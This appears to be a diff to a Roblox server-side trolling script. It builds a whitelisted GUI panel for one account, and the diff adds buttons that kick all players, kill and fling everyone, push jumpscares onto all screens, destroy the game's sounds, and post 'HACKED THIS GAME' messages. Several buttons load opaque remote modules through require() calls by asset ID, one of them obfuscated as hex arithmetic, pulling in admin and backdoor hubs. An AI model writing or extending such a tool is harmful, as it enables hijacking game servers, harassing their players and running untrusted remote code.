@@ -1,5 +1,10 @@
 local Players = game:GetService("Players")
-local targetPlayer = Players:FindFirstChild("manusia_hitam60") or Players:GetPlayers()[1] 
+local targetPlayer = Players:FindFirstChild("manusia_hitam60") or Players:GetPlayers()[1]
+
+local whitelist = {"manusia_hitam60"}
+local isWhitelisted = false
+for _, name in pairs(whitelist) do if targetPlayer.Name == name then isWhitelisted = true break end end
+if not isWhitelisted then return end
 
 local ID_Main = "rbxassetid://71983226245811"
 local ID_Part = "rbxassetid://131552532497284"
@@ -8,20 +13,21 @@ local ID_Music = "rbxassetid://138421944471718"
 
 if targetPlayer then
     local pGui = targetPlayer:WaitForChild("PlayerGui")
-    if pGui:FindFirstChild("manusia_hitam60 (ultimate ss)") then pGui["manusia_hitam60 (ultimate ss)"]:Destroy() end
+    if pGui:FindFirstChild("manusia_hitam60 (ultimate ss edition)") then pGui["manusia_hitam60 (ultimate ss edition)"]:Destroy() end
     
     local ScreenGui = Instance.new("ScreenGui", pGui)
-    ScreenGui.Name = "manusia_hitam60 (ultimate ss)"
+    ScreenGui.Name = "manusia_hitam60 (ultimate ss edition)"
     ScreenGui.ResetOnSpawn = false
     ScreenGui.DisplayOrder = 999
     
     local MainFrame = Instance.new("Frame", ScreenGui)
     MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
-    MainFrame.Size = UDim2.new(0, 420, 0, 240)
-    MainFrame.Position = UDim2.new(0.5, -210, 0.5, -120)
+    MainFrame.Size = UDim2.new(0, 420, 0, 260)
+    MainFrame.Position = UDim2.new(0.5, -210, 0.5, -135)
     MainFrame.Active = true MainFrame.Draggable = true
     Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 15)
 
+    -- Tombol Music Asli dari file .txt
     local MusicBtn = Instance.new("TextButton", MainFrame)
     MusicBtn.Size = UDim2.new(0, 50, 0, 25)
     MusicBtn.Position = UDim2.new(1, -60, 0, 5)
@@ -31,13 +37,21 @@ if targetPlayer then
     MusicBtn.Font = "SourceSansBold" MusicBtn.TextSize = 12
     Instance.new("UICorner", MusicBtn)
 
+    -- Tombol Stop yang ditambahkan (disamakan posisinya di sebelah kiri Music)
+    local StopMusicBtn = Instance.new("TextButton", MainFrame)
+    StopMusicBtn.Size = UDim2.new(0, 50, 0, 25)
+    StopMusicBtn.Position = UDim2.new(1, -115, 0, 5)
+    StopMusicBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    StopMusicBtn.Text = "Stop"
+    StopMusicBtn.TextColor3 = Color3.new(1,1,1)
+    StopMusicBtn.Font = "SourceSansBold" StopMusicBtn.TextSize = 12
+    Instance.new("UICorner", StopMusicBtn)
+
     local isPlaying = false
     local bgm = Instance.new("Sound", game.Workspace)
-    bgm.SoundId = ID_Music 
-    bgm.Looped = true 
-    bgm.Volume = 10000 
-    local dist = Instance.new("DistortionSoundEffect", bgm)
-    dist.Level = 0.8
+    bgm.Name = "MH60_BGM" -- Identitas lagu kita
+    bgm.SoundId = ID_Music bgm.Looped = true bgm.Volume = 10000 
+    local dist = Instance.new("DistortionSoundEffect", bgm) dist.Level = 0
 
     MusicBtn.MouseButton1Click:Connect(function()
         isPlaying = not isPlaying
@@ -45,11 +59,21 @@ if targetPlayer then
         else bgm:Stop() MusicBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50) end
     end)
 
+    -- Fungsi Stop All Music
+    StopMusicBtn.MouseButton1Click:Connect(function()
+        for _, v in pairs(game:GetDescendants()) do
+            if v:IsA("Sound") and v ~= bgm then
+                v:Stop()
+                v:Destroy()
+            end
+        end
+    end)
+
     local Title = Instance.new("TextLabel", MainFrame)
     Title.Size = UDim2.new(1, 0, 0, 35)
-    Title.Text = "  MANUSIA_HITAM60 (ULTIMATE SS)"
+    Title.Text = "  MANUSIA_HITAM60 (ULTIMATE SS EDITION)"
     Title.TextColor3 = Color3.new(0,0,0)
-    Title.BackgroundTransparency = 1 Title.TextSize = 18
+    Title.BackgroundTransparency = 1 Title.TextSize = 16
     Title.Font = "SourceSansBold" Title.TextXAlignment = "Left"
 
     local ButtonGrid = Instance.new("Frame", MainFrame)
@@ -57,13 +81,14 @@ if targetPlayer then
     ButtonGrid.Position = UDim2.new(0, 10, 0, 45)
     ButtonGrid.Size = UDim2.new(1, -20, 1, -55)
     local Grid = Instance.new("UIGridLayout", ButtonGrid)
-    Grid.CellSize = UDim2.new(0, 75, 0, 40) Grid.CellPadding = UDim2.new(0, 6, 0, 6)
-    Grid.HorizontalAlignment = "Center"
+    Grid.CellSize = UDim2.new(0, 75, 0, 34)
+    Grid.CellPadding = UDim2.new(0, 6, 0, 6)
+    Grid.HorizontalAlignment = Enum.HorizontalAlignment.Center
 
     local function makeBtn(name, color, func)
         local btn = Instance.new("TextButton", ButtonGrid)
         btn.Text = name btn.BackgroundColor3 = color btn.TextColor3 = Color3.new(1,1,1)
-        btn.Font = "SourceSansBold" btn.TextSize = 10 btn.TextWrapped = true
+        btn.Font = "SourceSansBold" btn.TextSize = 9 btn.TextWrapped = true
         Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
         btn.MouseButton1Click:Connect(func)
     end
@@ -72,17 +97,12 @@ if targetPlayer then
 
     makeBtn("Skybox", blue, function()
         local Lighting = game:GetService("Lighting")
-        for _, v in pairs(Lighting:GetChildren()) do
-            if v:IsA("Sky") or v:IsA("Atmosphere") or v:IsA("Clouds") or v:IsA("PostProcessEffect") then
-                v:Destroy()
-            end
-        end
+        for _, v in pairs(Lighting:GetChildren()) do if v:IsA("Sky") or v:IsA("Atmosphere") or v:IsA("Clouds") or v:IsA("PostProcessEffect") then v:Destroy() end end
         Lighting.FogEnd = 9e9 Lighting.ClockTime = 12 Lighting.Brightness = 2
         Lighting.GlobalShadows = false Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
         local newSky = Instance.new("Sky", Lighting)
         newSky.SkyboxBk = ID_Main newSky.SkyboxDn = ID_Main newSky.SkyboxFt = ID_Main
         newSky.SkyboxLf = ID_Main newSky.SkyboxRt = ID_Main newSky.SkyboxUp = ID_Main
-        newSky.SunAngularSize = 0 newSky.MoonAngularSize = 0
     end)
 
     makeBtn("Decal Spam", blue, function()
@@ -97,19 +117,14 @@ if targetPlayer then
                 local head = character:WaitForChild("Head", 10)
                 if not head then return end
                 local attachment = Instance.new("Attachment", head)
-                attachment.Name = "Abil_Attachment_Stack"
+                attachment.Name = "MH60_Attachment"
                 local emitter = Instance.new("ParticleEmitter", attachment)
-                emitter.Texture = ID_Part
-                emitter.Rate = 10000
-                emitter.Lifetime = NumberRange.new(20)
-                emitter.Speed = NumberRange.new(150)
-                emitter.Size = NumberSequence.new(10) 
-                emitter.SpreadAngle = Vector2.new(45, 45)
-                emitter.EmissionDirection = Enum.NormalId.Top
+                emitter.Texture = ID_Part emitter.Rate = 10000 emitter.Lifetime = NumberRange.new(20)
+                emitter.Speed = NumberRange.new(150) emitter.Size = NumberSequence.new(10) 
+                emitter.SpreadAngle = Vector2.new(45, 45) emitter.EmissionDirection = Enum.NormalId.Top
                 emitter.Acceleration = Vector3.new(0, 3, 0)
             end
-            setup(player.Character)
-            player.CharacterAdded:Connect(setup)
+            setup(player.Character) player.CharacterAdded:Connect(setup)
         end
         for _, v in pairs(Players:GetPlayers()) do applyParticleEffect(v) end
         Players.PlayerAdded:Connect(applyParticleEffect)
@@ -118,19 +133,19 @@ if targetPlayer then
     makeBtn("Jumpscare", blue, function()
         for _, p in pairs(Players:GetPlayers()) do task.spawn(function()
             local s = Instance.new("Sound", workspace) s.SoundId = ID_Jump s.Volume = 500 s:Play()
-            local g = Instance.new("ScreenGui", p.PlayerGui) g.DisplayOrder = 1
-            local i = Instance.new("ImageLabel", g) i.Size = UDim2.new(1,0,1,0) i.Image = ID_Main i.BackgroundColor3 = Color3.new(0,0,0)
+            local g = Instance.new("ScreenGui", p.PlayerGui) local i = Instance.new("ImageLabel", g)
+            i.Size = UDim2.new(1,0,1,0) i.Image = ID_Main i.BackgroundColor3 = Color3.new(0,0,0)
             task.wait(8) g:Destroy() s:Destroy()
         end) end
     end)
 
     makeBtn("Message All", blue, function()
-        local m = Instance.new("Message", workspace) m.Text = "THIS GAME HAS BEEN OWNED BY MANUSIA_HITAM60"
+        local m = Instance.new("Message", workspace) m.Text = "MANUSIA_HITAM60 HACKED THIS GAME LOL!!!🤟😝🤟"
         task.delay(5, function() m:Destroy() end)
     end)
 
     makeBtn("Hint", blue, function()
-        local h = Instance.new("Hint", workspace) h.Text = "MANUSIA_HITAM60 IS HERE"
+        local h = Instance.new("Hint", workspace) h.Text = "MANUSIA_HITAM60 HACKED THIS FUCKING GAME!!! 🤟😝🤟"
         task.delay(9e9, function() h:Destroy() end)
     end)
 
@@ -140,53 +155,38 @@ if targetPlayer then
 
     makeBtn("Mr.Bean Admin", blue, function() require(16426905729)(targetPlayer.Name) end)
     makeBtn("Blue2Spooky", blue, function() require(137870571533698):load(targetPlayer.Name) end)
-    makeBtn("Guns GUI (R6)", blue, function() require(7633712551)(targetPlayer.Name, "Guns") end)
-
-    makeBtn("Shutdown", green, function() 
-        for _, v in pairs(Players:GetPlayers()) do v:Kick("SERVER TERMINATED BY MANUSIA_HITAM60") end 
-    end)
-
+    makeBtn("Guns (R6)", blue, function() require(7633712551)(targetPlayer.Name, "Guns") end)
+    makeBtn("Shutdown", green, function() for _, v in pairs(Players:GetPlayers()) do v:Kick("THE SERVER SHOUTDOWN BECAUSE MANUSIA_HITAM60!!! 🤟😝🤟") end end)
     makeBtn("Kill All", green, function() for _, v in pairs(Players:GetPlayers()) do if v.Character then v.Character:BreakJoints() end end end)
     
     makeBtn("Disco", green, function() 
-        task.spawn(function() 
-            game.Lighting.GlobalShadows = false
-            while true do 
-                local c = Color3.fromHSV(math.random(), 1, 1)
-                game.Lighting.Ambient = c
-                game.Lighting.OutdoorAmbient = c
-                game.Lighting.FogColor = c
-                game.Lighting.ColorShift_Top = c
-                task.wait(0.1) 
-            end 
+        task.spawn(function() game.Lighting.GlobalShadows = false
+            while true do local c = Color3.fromHSV(math.random(), 1, 1) game.Lighting.Ambient = c game.Lighting.OutdoorAmbient = c task.wait(0.1) end 
         end) 
     end)
-    
+  
     makeBtn("Explode Rain", green, function() 
         task.spawn(function() 
-            local spawnPos = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") and targetPlayer.Character.HumanoidRootPart.Position or Vector3.new(0,0,0)
+             local spawnPos = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") and targetPlayer.Character.HumanoidRootPart.Position or Vector3.new(0,0,0)
             while true do
-                if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                    spawnPos = targetPlayer.Character.HumanoidRootPart.Position
-                end
-                local b = Instance.new("Part", workspace) b.Shape = "Ball" b.Size = Vector3.new(3,3,3)
+                if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then spawnPos = targetPlayer.Character.HumanoidRootPart.Position end
+                local b = Instance.new("Part", workspace) b.Shape = Enum.PartType.Ball b.Size = Vector3.new(3,3,3)
                 b.Position = spawnPos + Vector3.new(math.random(-499,499), 200, math.random(-499,499))
-                b.Color = Color3.new(1,0,0) b.Material = "Neon"
+                b.Color = Color3.new(1,0,0) b.Material = Enum.Material.Neon
                 b.Touched:Connect(function() 
                     local ex = Instance.new("Explosion", workspace) ex.Position = b.Position ex.BlastRadius = 25
-                    ex.Hit:Connect(function(hit)
-                        if hit and hit:IsA("BasePart") and not hit:IsDescendantOf(targetPlayer.Character) then
-                            hit.Anchored = false hit:ApplyImpulse((hit.Position - ex.Position).Unit * 500)
-                        end
-                    end)
+                    ex.Hit:Connect(function(hit) if hit and hit:IsA("BasePart") and not hit:IsDescendantOf(targetPlayer.Character) then hit.Anchored = false end end)
                     b:Destroy() 
                 end) 
-                task.wait(0.05) -- Kecepatan Pelan (Versi Lama)
+                task.wait(0.05)
             end 
         end) 
     end)
 
-    makeBtn("Arctic", green, function() require((0xb36fc * 0x82e02f1) + 0x1597f + 0x690):Fire(targetPlayer.Name) end)
+    makeBtn("Sensation", green, function() 
+        require(100263845596551)(targetPlayer.Name, ColorSequence.new(Color3.fromRGB(71, 148, 253), Color3.fromRGB(71, 253, 160)), "Standard") 
+    end)
+    
     makeBtn("Polaria", black, function() require(110951620907921):Pload(targetPlayer.Name) end)
 
     makeBtn("Face All", black, function()
@@ -200,17 +200,31 @@ if targetPlayer then
         task.spawn(function() 
             local spawnPos = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") and targetPlayer.Character.HumanoidRootPart.Position or Vector3.new(0,0,0)
             while true do
-                if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                    spawnPos = targetPlayer.Character.HumanoidRootPart.Position
-                end
-                local b = Instance.new("Part", workspace) b.Shape = "Ball" 
-                b.Position = spawnPos + Vector3.new(math.random(-499,499), 250, math.random(-499,499))
-                b.Size = Vector3.new(4,4,4) b.Color = Color3.fromHSV(math.random(),1,1) b.Material = "Neon" b.CanCollide = true 
-                task.wait(0.1) -- Kecepatan Pelan (Versi Lama)
+                if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then spawnPos = targetPlayer.Character.HumanoidRootPart.Position end
+                local b = Instance.new("Part", workspace) b.Shape = Enum.PartType.Ball b.Position = spawnPos + Vector3.new(math.random(-499,499), 250, math.random(-499,499))
+                b.Size = Vector3.new(4,4,4) b.Color = Color3.fromHSV(math.random(),1,1) b.Material = Enum.Material.Neon b.CanCollide = true task.wait(0.1)
             end 
         end) 
     end)
 
     makeBtn("Happy Hub", black, function() require(109229360070706):Hload(targetPlayer.Name) end)
     makeBtn("MatzV5", black, function() require(139176740647330).MATZ(targetPlayer.Name) end)
+    makeBtn("Rush", black, function() require(104732504345735).jumpscare(targetPlayer.Name) end)
+    makeBtn("Dark Mango", black, function() require(122775270569362)(targetPlayer.Name) end)
+    makeBtn("F3X", black, function() require(4869378421).F3X(targetPlayer.Name) end)
+    makeBtn("RoLoader", black, function() 
+        require(112796675826571).RoLoader(targetPlayer.Name) 
+    end)
+
+    makeBtn("Fling All", black, function()
+        for _, v in pairs(Players:GetPlayers()) do
+            if v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
+                local hrp = v.Character.HumanoidRootPart
+                local bv = Instance.new("BodyVelocity", hrp)
+                bv.Velocity = Vector3.new(0, 9e9, 0)
+                bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+                task.delay(0.2, function() bv:Destroy() end)
+            end
+        end
+    end)
 end
